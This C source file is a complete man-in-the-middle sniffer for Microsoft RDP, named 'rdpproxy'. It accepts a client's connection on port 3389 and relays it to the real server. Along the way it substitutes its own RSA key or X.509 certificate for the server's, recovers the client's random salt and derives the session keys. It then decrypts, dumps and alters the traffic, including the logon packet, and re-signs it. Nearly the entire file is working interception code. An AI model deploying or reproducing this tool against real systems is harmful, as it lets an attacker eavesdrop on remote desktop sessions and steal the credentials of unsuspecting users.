/* -*- c-basic-offset: 8 -*-
 * rdpproxy: Man-in-the-middle RDP sniffer
 * Matt Chapman <matthewc@cse.unsw.edu.au>
 */

#define _GNU_SOURCE
#include <stdio.h>		/* perror */
#include <string.h>
#include <unistd.h>		/* select read write close */
#include <fcntl.h>		/* open */
#include <sys/socket.h>		/* socket bind listen accept connect */
#include <netinet/in.h>		/* htons htonl */
#include <netinet/tcp.h>	/* SOL_TCP TCP_NODELAY */
#include <arpa/inet.h>		/* inet_addr */
#include <netdb.h>		/* gethostbyname */

#include <openssl/x509v3.h>
#include "../rdesktop/rdesktop.h"

#if LINUX_NETFILTER
#include <linux/netfilter_ipv4.h>
#endif

#define CLIENT                  0
#define SERVER                  1

#define TCP_PORT_RDP		3389
#define SEC_ENCRYPT             0x0008
#define SEC_RANDOM_SIZE         32
#define SEC_MODULUS_SIZE        64
#define SEC_EXPONENT_SIZE       4

#ifdef USE_X509
#define CA_CERT_FILE	"cacert.der"
#define CERT_FILE	"cert.der"
#define PRIV_KEY_FILE	"privkey.der"
#else
#define PRIV_KEY_FILE	"tsprivkey.der"
#endif

static const unsigned char conn_response_hdr[] = { 0x02, 0xf0, 0x80, 0x7f, 0x66 };
#ifdef USE_X509
static const unsigned char cert_hdr[] = { 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };
static const unsigned char cert_hdr2[] = { 0x02, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00 };

static const unsigned char server_key_hdr[] = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x04, 0x05, 0x00, 0x03, 0x4b, 0x00 };	/* OID and ASN1 header */
static const unsigned char server_salt_hdr[] =
	{ SEC_RANDOM_SIZE, 0x00, 0x00, 0x00, 0x69, 0x05, 0x00, 0x00 };
/*  ^^^ seems to be 0x1e instead of 0x10 in "my" version of the protocol". It's some kind of length. */
static const unsigned char licence_blob_hdr[] = { 0x00, 0x00, 0x48, 0x00 };	/* not very precise, but hey */
#else
static const unsigned char server_key_hdr[] = { 'R', 'S', 'A', '1' };
static const unsigned char server_salt_hdr[] =
	{ SEC_RANDOM_SIZE, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00 };
#endif

static const unsigned char crypt_type_hdr[] = { 0x02, 0xc0, 0x0c, 0x00 };
static const unsigned char client_salt_hdr[] =
	{ 0x01, 0x00, 0x00, 0x00, SEC_MODULUS_SIZE + 8, 0x00, 0x00, 0x00 };


static unsigned char server_salt[SEC_RANDOM_SIZE];
static RSA *server_key;
static RSA *proxy_key;

static int server_key_subst_done;
static int client_key_subst_done;
static int compression_substs_done;
static int faked_packet;

void sec_decrypt(uint8 * data, int length);
void sec_encrypt(uint8 * data, int length);

/* produce a hex dump */
void
hexdump(unsigned char *p, unsigned int len)
{
	unsigned char *line = p;
	unsigned int thisline, offset = 0;
	int i;

	if (faked_packet)
	{
		printf("#0, #0 from Server, type TPKT, l: %d, faked\n", len);
		faked_packet = 0;
	}

	while (offset < len)
	{
		printf("%04x ", offset);
		thisline = len - offset;
		if (thisline > 16)
			thisline = 16;

		for (i = 0; i < thisline; i++)
			printf("%02x ", line[i]);

		for (; i < 16; i++)
			printf("   ");

		for (i = 0; i < thisline; i++)
			printf("%c", (line[i] >= 0x20 && line[i] < 0x7f) ? line[i] : '.');

		printf("\n");
		offset += thisline;
		line += thisline;
	}
	fflush(stdout);
}

/* reverse an array in situ */
static void
reverse(unsigned char *p, unsigned int len)
{
	char temp;
	int i, j;

	for (i = 0, j = len - 1; i < j; i++, j--)
	{
		temp = p[i];
		p[i] = p[j];
		p[j] = temp;
	}
}

static int
read_file(char *filename, char *buffer, int maxlen)
{
	int fd, len;

	fd = open(filename, O_RDONLY);
	if (fd == -1)
	{
		perror(filename);
		return -1;
	}

	len = read(fd, buffer, maxlen);
	close(fd);
	return len;
}

static RSA *
make_public_key(unsigned char *modulus, unsigned char *exponent)
{
	BIGNUM *n, *e;
	RSA *key;

	n = BN_new();
	reverse(modulus, SEC_MODULUS_SIZE);
	BN_bin2bn(modulus, SEC_MODULUS_SIZE, n);

	e = BN_new();
	reverse(exponent, SEC_EXPONENT_SIZE);
	BN_bin2bn(exponent, SEC_EXPONENT_SIZE, e);

	key = RSA_new();
	key->n = n;
	key->e = e;
	return key;

}

static void
substitute_client(unsigned char *buffer, unsigned int len)
{
	unsigned char client_salt[SEC_RANDOM_SIZE];
	unsigned char *key;

	if (client_key_subst_done)
	{
		return;
	}
	else
	{
		printf("Client key substitution not done..\n");
	}

	/* temporary hack - pretend client asked for RDP4-type encryption */
	if (!server_key_subst_done)
	{
		printf("Trying to substitute crypt type..\n");
		key = memmem(buffer, len, crypt_type_hdr, sizeof(crypt_type_hdr));
		if (key == NULL)
			return;

		key += sizeof(crypt_type_hdr);
		*key = 1;
		printf("Substituted crypt type\n");
		return;
	}

	/* find client salt */
	key = memmem(buffer, len, client_salt_hdr, sizeof(client_salt_hdr));
	if (key == NULL)
	{
		printf("Didn't find client salt\n");
		return;
	}
	else
	{
		printf("Found client salt(!)\n");
	}

	/* reencrypt with server key */
	key += sizeof(client_salt_hdr);
	reverse(key, SEC_MODULUS_SIZE);
	       
	printf("RSA_private_decrypt returns %d\n", 
	       RSA_private_decrypt(SEC_MODULUS_SIZE, key, key, 
				   proxy_key, RSA_NO_PADDING));

	//	printf("The 32 bytes before the client salt is:\n");
	//	faked_packet = 1;
	//	hexdump(key, SEC_MODULUS_SIZE-SEC_RANDOM_SIZE);

	memcpy(client_salt, key + SEC_MODULUS_SIZE - SEC_RANDOM_SIZE, SEC_RANDOM_SIZE);
	reverse(client_salt, SEC_RANDOM_SIZE);

	RSA_public_encrypt(SEC_MODULUS_SIZE, key, key, server_key, RSA_NO_PADDING);
	reverse(key, SEC_MODULUS_SIZE);

	/* generate data encryption keys */
	sec_generate_keys(client_salt, server_salt, 1);

	printf("Substituted client salt\n");
	client_key_subst_done = 1;
}

#ifdef USE_X509
static int licence_blob_subst_done;

static void
substitute_licence(unsigned char *buffer, unsigned int len)
{
	unsigned char *key;

	if (licence_blob_subst_done || !client_key_subst_done)
		return;

	key = memmem(buffer, len, licence_blob_hdr, sizeof(licence_blob_hdr));
	if (key == NULL)
		return;

	/* reencrypt with server key */
	key += sizeof(licence_blob_hdr);
	reverse(key, SEC_MODULUS_SIZE);
	RSA_private_decrypt(SEC_MODULUS_SIZE, key, key, proxy_key, RSA_NO_PADDING);

	//      hexdump(key, SEC_MODULUS_SIZE);

	RSA_public_encrypt(SEC_MODULUS_SIZE, key, key, server_key, RSA_NO_PADDING);
	reverse(key, SEC_MODULUS_SIZE);

	printf("Substituted licence blob\n");
	licence_blob_subst_done = 1;
}
#endif

static unsigned int
substitute_server(unsigned char *buffer, unsigned int len)
{
#ifndef USE_X509
	unsigned char server_modulus[SEC_MODULUS_SIZE];
	unsigned char server_exponent[SEC_EXPONENT_SIZE];
#endif
	X509 *x509;
	unsigned char *key, *rsakey;
	unsigned char *mcslen_p;
	unsigned char *userdata_length_p;
	unsigned char *rem_length_p;
	unsigned char *rsainfolen_p;
	unsigned char *cryptinfo_len_p;
	uint16 mcslen, userdata_length, rem_length;
	uint32 cacert_len, cert_len;
	int n, tag, delta;
	uint16 length;
	uint32 rsainfolen = 0;

	if (server_key_subst_done)
		return len;
	key = memmem(buffer + 3, len - 3, conn_response_hdr, sizeof(conn_response_hdr));

	if (NULL == key)
		return len;

	printf("Found MCS response packet\n");

	mcslen_p = key + sizeof(conn_response_hdr) + 1;
	mcslen = buf_in_uint16be(mcslen_p);

	key += sizeof(conn_response_hdr) + 4 * 16;

	rem_length_p = key - 2;
	userdata_length_p = key - 25;

	tag = *key + (*(key + 1) << 8);
	key += 2;

	while (tag != 0x0c02)
	{
		length = *key + (*(key + 1) << 8);
		printf("Got length %x\n", length);
		key += length - 2;
		tag = *key + (*(key + 1) << 8);
		key += 2;
	}

	length = *key + (*(key + 1) << 8);
	printf("Got length %d\n", length);
	cryptinfo_len_p = key;	// Save position of cryptinfo length
	key += 2 + 12;		// Skip length, Skip RC4 key size, Encr. level, Random salt len, RSA info len.
	rsainfolen = buf_in_uint32le(key);
	rsainfolen_p = key;	// Save position of RSA info len.
	key += 4;
	printf("RSA info len: %d\n", rsainfolen);

	memcpy(server_salt, key, SEC_RANDOM_SIZE);

	key += SEC_RANDOM_SIZE;

	/* find RSA key structure */
	rsakey = memmem(buffer, len, server_key_hdr, sizeof(server_key_hdr));
	if (key == NULL)
		return len;
	printf("Found RSA key structure\n");


#ifdef USE_X509

	/* extract server key */
/* 	rsakey += sizeof(server_key_hdr); */
/* 	server_key = d2i_RSAPublicKey(NULL, &rsakey, len-(rsakey-buffer)); */
/* 	printf("RSA_size(server_key): %d\n", RSA_size(server_key)); */
/* 	if (server_key == NULL) */
/* 	{ */
/* 		printf("Error parsing public key\n"); */
/* 		return len; */
/* 	} */

	key += 8;

	cacert_len = buf_in_uint32le(key);
	cert_len = buf_in_uint32le(key + cacert_len + 4);
	rsakey = key + cacert_len + 8;
	x509 = d2i_X509(NULL, &rsakey, cert_len);
	if (NULL == x509)
	{
		printf("Failed to load X509 structure");
		return len;
	}

	if (OBJ_obj2nid(x509->cert_info->key->algor->algorithm) == NID_md5WithRSAEncryption)
	{
		printf("Re-setting algorithm type to RSA ($#¤?=## Microsoft!)\n");
		x509->cert_info->key->algor->algorithm = OBJ_nid2obj(NID_rsaEncryption);
	}

	server_key = (RSA *) X509_get_pubkey(x509)->pkey.ptr;

	/* This is a bit ugly. But who cares? :-)  */

	cacert_len = read_file(CA_CERT_FILE, key + 4, 1024);
	*(unsigned long *) key = cacert_len;	/* FIXME endianness */

	key += 4 + cacert_len;	// Skip length and newly "written" certificate.
	cert_len = read_file(CERT_FILE, key + 4, 1024);
	*(unsigned long *) key = cert_len;	/* FIXME endianness */

	printf("CA cert length is %d, cert length is %d\n", cacert_len, cert_len);

	delta = (cacert_len + cert_len + 32) - rsainfolen;

	if (0 < delta)
	{
		printf("Compensating RSA info len - should be %d\n", rsainfolen + delta);
		buf_out_uint32(rsainfolen_p, rsainfolen + delta);
		printf("Compensating Tagged data length - should be %d\n", length + delta);
		buf_out_uint16le(cryptinfo_len_p, length + delta);
		printf("Compensating MCS data length - should be %d\n", mcslen + delta);
		buf_out_uint16be(mcslen_p, mcslen + delta);
		printf("Compensating packet length - current value %d, should be %d\n",
		       len, len + delta);
		len += delta;
		buf_out_uint16be(buffer + 2, len);
		printf("Padding with zeros at end of packet\n");
		memset(buffer + len + delta - 16, 0, 16);

		rem_length = buf_in_uint16be(rem_length_p) & ~0x8000;
		buf_out_uint16be(rem_length_p, (rem_length + delta) | 0x8000);

		userdata_length = buf_in_uint16be(userdata_length_p);
		buf_out_uint16be(userdata_length_p, userdata_length + delta);

	}
#else

	/* extract server key */
	rsakey += 16;
	memcpy(server_exponent, rsakey, SEC_EXPONENT_SIZE);
	rsakey += SEC_EXPONENT_SIZE;
	memcpy(server_modulus, rsakey, SEC_MODULUS_SIZE);
	server_key = make_public_key(server_modulus, server_exponent);

	/* replace */
	BN_bn2bin(proxy_key->n, rsakey);
	reverse(rsakey, SEC_MODULUS_SIZE);
#endif

	printf("Substituted server key\n");
	faked_packet = 1;
	server_key_subst_done = 1;

	return len;
}

static void
decrypt(unsigned char *buffer, unsigned int len, void (*fn) (unsigned char *buffer, int length))
{
	int encrypted = 0;
	int skip;

	if (buffer[0] == 3)	/* ISO over TCP */
	{
		if (buffer[13] & 0x80)	/* 16-bit length in MCS header */
			skip = 15 + 12;
		else
			skip = 14 + 12;

		if (len > skip)
			encrypted = *(unsigned long *) (buffer + skip - 12) & SEC_ENCRYPT;
	}
	else			/* assume RDP5 style packet */
	{
		if (buffer[1] & 0x80)	/* 16-bit length */
			skip = 3 + 8;
		else
			skip = 2 + 8;

		if (len > skip)
			encrypted = buffer[0] & 0x80;
	}

	if (encrypted)
	{
		if (client_key_subst_done)
			fn(buffer + skip, len - skip);
		else
			printf("Can't decrypt, haven't seen client random!\n");
	}

	if (server_key_subst_done)
		hexdump(buffer, len);
}

static void
substitute_compression(unsigned char *buffer, unsigned int len)
{
	uint32 flags, packetflags;


	if (compression_substs_done)
		return;
	if (!(buffer[7] & 0x64))
	{			/* Not a MCS SDRQ - actually quite a 
				   useless check since this function isn't 
				   called unless the packet is from the client */
		return;
	}

	packetflags = buf_in_uint32le(buffer + 15);
	if (!(packetflags & 0x0040))
		return;		/* Not a RDP Logon info packet */

	flags = buf_in_uint32le(buffer + 31);

	printf("Found the RDP Logon packet, flags is %d (%x)\n", flags, flags);

	if (flags & 0x280)
	{
		printf("Setting compression flags to zero\n");
		flags &= ~0x280;

		buf_out_uint32(buffer + 31, flags);

	}
	printf("Flags is now %d (%x)\n", flags, flags);

	compression_substs_done = 1;
}

static void
decrypt_client(unsigned char *buffer, unsigned int len, int server)
{

	int encrypted = 0;
	int skip;
	unsigned char buffercopy[65536];
	uint8 signature[8];

	if (buffer[0] == 3)	/* ISO over TCP */
	{
		if (buffer[13] & 0x80)	/* 16-bit length in MCS header */
			skip = 15 + 12;
		else
			skip = 14 + 12;

		if (len > skip)
			encrypted = *(unsigned long *) (buffer + skip - 12) & SEC_ENCRYPT;
	}
	else			/* assume RDP5 style packet */
	{
		if (buffer[1] & 0x80)	/* 16-bit length */
			skip = 3 + 8;
		else
			skip = 2 + 8;

		if (len > skip)
			encrypted = buffer[0] & 0x80;
	}

	substitute_client(buffer, len);


	if (encrypted && client_key_subst_done)
	{
		sec_encrypt(buffer + skip, len - skip);
		memset(signature, 0, 8);

		/* This is where you can put substitution code */

		substitute_compression(buffer, len);

#ifdef USE_X509
		substitute_licence(buffer, len);
#endif
		sec_sign_buf(signature, 8, buffer + skip, len - skip);
		printf("Signature should be ");
		hexdump(signature, 8);
		hexdump(buffer, len);
		memcpy(buffer + skip - 8, signature, 8);
		sec_encrypt2(buffer + skip, len - skip);
	}
	else
	{
		printf("Can't decrypt, haven't seen client random!\n");
		hexdump(buffer, len);
	}

	send(server, buffer, len, 0);


}

static int
recv_pdu(int fd, unsigned char *buffer, unsigned int len, int part)
{
	unsigned int pdulen;
	int res;

	static int clnt_packetnr;
	static int srvr_packetnr;
	static int total_packetnr;

	res = recv(fd, buffer, 4, MSG_WAITALL);
	if (res <= 0)
		return res;

	if (CLIENT == part)
	{
		printf("#%d, #%d from Client, ", ++total_packetnr, ++clnt_packetnr);
	}
	else
	{
		printf("#%d, #%d from Server, ", ++total_packetnr, ++srvr_packetnr);
	}


	if (buffer[0] == 3)	/* ISO over TCP */
	{
		pdulen = ((unsigned int) buffer[2] << 8) | buffer[3];
		printf("type TPKT, l: %d, ", pdulen);

	}
	else			/* assume RDP5 style packet */
	{
		pdulen = buffer[1];

		if (pdulen & 0x80)
			pdulen = ((pdulen & 0x7f) << 8) | buffer[2];
		printf("type RDP5, l: %d, ", pdulen);
	}

	if (pdulen > len)
	{
		fprintf(stderr, "PDU size %d would overflow buffer\n", pdulen);
		return 0;
	}

	res = recv(fd, buffer + 4, pdulen - 4, MSG_WAITALL);
	if (res <= 0)
		return res;

	printf("read %d bytes\n", res + 4);

	return (res + 4);
}

static void
relay(int client, int server)
{
	unsigned char buffer[65536];
	fd_set fds;
	int max, len;

	FD_ZERO(&fds);
	max = (client > server) ? client : server;

	while (1)
	{
		FD_SET(client, &fds);
		FD_SET(server, &fds);

		switch (select(max + 1, &fds, NULL, NULL, NULL))
		{
			case -1:
				perror("select");

			case 0:
				return;
		}

		if (FD_ISSET(client, &fds))
		{
			len = recv_pdu(client, buffer, sizeof(buffer), CLIENT);
			switch (len)
			{
				case -1:
					perror("client recv");
				case 0:
					return;
			}

			decrypt_client(buffer, len, server);
		}

		if (FD_ISSET(server, &fds))
		{
			len = recv_pdu(server, buffer, sizeof(buffer), SERVER);
			switch (len)
			{
				case -1:
					perror("server recv");
				case 0:
					return;
			}
			if (!server_key_subst_done)
			{
				hexdump(buffer, len);
			}
			len = substitute_server(buffer, len);
			send(client, buffer, len, 0);
			decrypt(buffer, len, sec_decrypt);
		}
	}
}

int
main(int argc, char *argv[])
{
	struct sockaddr_in listener_addr;
	struct sockaddr_in server_addr;
	struct hostent *nslookup;
	int listener, client, server;
	unsigned char privkey_buffer[1024];
	unsigned char *privkey = privkey_buffer;
	int true = 1;
	int n;

#ifndef LINUX_NETFILTER
	if (argc < 2)
	{
		printf("Usage: rdpproxy <server ip>\n");
		return 1;
	}
#endif

	n = read_file(PRIV_KEY_FILE, privkey_buffer, sizeof(privkey_buffer));



	proxy_key = d2i_RSAPrivateKey(NULL, &privkey, n);
	memset(privkey_buffer, 0, sizeof(privkey_buffer));
	if (proxy_key == NULL)
	{
		printf("Error loading private key\n");
		return 1;
	}

	if ((listener = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		return 1;
	}

	listener_addr.sin_family = AF_INET;
	listener_addr.sin_port = htons(TCP_PORT_RDP);
	listener_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(true));

	if (bind(listener, (struct sockaddr *) &listener_addr, sizeof(listener_addr)) < 0)
	{
		perror("bind");
		return 1;
	}

	if (listen(listener, 1) < 0)
	{
		perror("listen");
		return 1;
	}

	printf("RDPPROXY: waiting for connection...\n");

	if ((client = accept(listener, NULL, NULL)) < 0)
	{
		perror("accept");
		return 1;
	}

	if ((server = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		return 1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(TCP_PORT_RDP);

#ifdef LINUX_NETFILTER
	if (argc < 2)
	{
		/* Fetch server address from netfilter */
		size_t sock_sz;
		sock_sz = sizeof(server_addr);

		if (getsockopt(client, SOL_IP, SO_ORIGINAL_DST, &server_addr, &sock_sz) != 0)
		{
			perror("getsockopt");
			fprintf(stderr, "Not a redirected connection?\n");
			exit(1);
		}

		fprintf(stderr, "server IP = %s\n", inet_ntoa(server_addr.sin_addr));
	}
	else
#endif
	{
		/* Use server name from command line */
		if (NULL != (nslookup = gethostbyname(argv[1])))
		{
			memcpy(&server_addr.sin_addr, nslookup->h_addr,
			       sizeof(server_addr.sin_addr));
		}
		else if (INADDR_NONE == (server_addr.sin_addr.s_addr = inet_addr(argv[1])))
		{
			printf("%s: Unable to resolve host\n", argv[1]);
			return 1;
		}
	}

	if (connect(server, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0)
	{
		perror("connect");
		return 1;
	}

	setsockopt(client, SOL_TCP, TCP_NODELAY, &true, sizeof(true));
	setsockopt(server, SOL_TCP, TCP_NODELAY, &true, sizeof(true));

	relay(client, server);

	close(server);
	close(client);
	return 0;
}
